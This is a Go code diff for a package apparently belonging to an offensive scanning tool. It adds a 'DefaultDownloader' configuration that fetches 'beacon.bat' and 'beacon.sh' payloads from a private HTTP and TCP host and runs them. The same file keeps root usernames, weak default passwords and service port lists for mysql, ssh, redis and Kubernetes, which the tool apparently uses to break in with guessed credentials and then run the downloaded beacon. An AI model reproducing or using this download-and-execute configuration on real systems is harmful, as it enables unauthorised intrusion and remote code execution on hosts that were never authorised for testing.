@@ -1,6 +1,8 @@
 package common
 
-import "github.com/404tk/lazyscan/common/queue"
+import (
+	"github.com/404tk/lazyscan/common/queue"
+)
 
 type HostInfo struct {
 	Host             string
@@ -21,6 +23,35 @@ type Command struct {
 	WinCommand  string
 }
 
+type Downloader struct {
+	WinHTTP  Loader
+	UnixHTTP Loader
+	UnixTCP  Loader
+}
+type Loader struct {
+	Addr        string
+	FileName    string
+	ExecCommand string
+}
+
+var DefaultDownloader = Downloader{
+	WinHTTP: Loader{
+		Addr:        "http://192.168.1.2:8080/beacon.bat",
+		FileName:    "beacon.bat",
+		ExecCommand: "beacon.bat",
+	},
+	UnixHTTP: Loader{
+		Addr:        "http://192.168.1.2:8080/beacon.sh",
+		FileName:    "beacon.sh",
+		ExecCommand: "beacon.sh",
+	},
+	UnixTCP: Loader{
+		Addr:        "192.168.1.2:8553/beacon.sh",
+		FileName:    "beacon.sh",
+		ExecCommand: "beacon.sh",
+	},
+}
+
 var Userdict = map[string][]string{
 	"mysql":      {"root"},
 	"ssh":        {"root"},
@@ -29,8 +60,6 @@ var Userdict = map[string][]string{
 }
 
 var Passwords = []string{"123456", "{user}", "{user}@123"}
-
-var DefaultPorts = "22,1433,2375,2379,3306,5432,6379,6443"
 
 var PortList = map[string]string{
 	"ssh":           "22",
@@ -41,5 +70,4 @@ var PortList = map[string]string{
 	"postgresql":    "5432",
 	"redis":         "6379",
 	"kube-api":      "6443",
-	"all":           "0",
 }
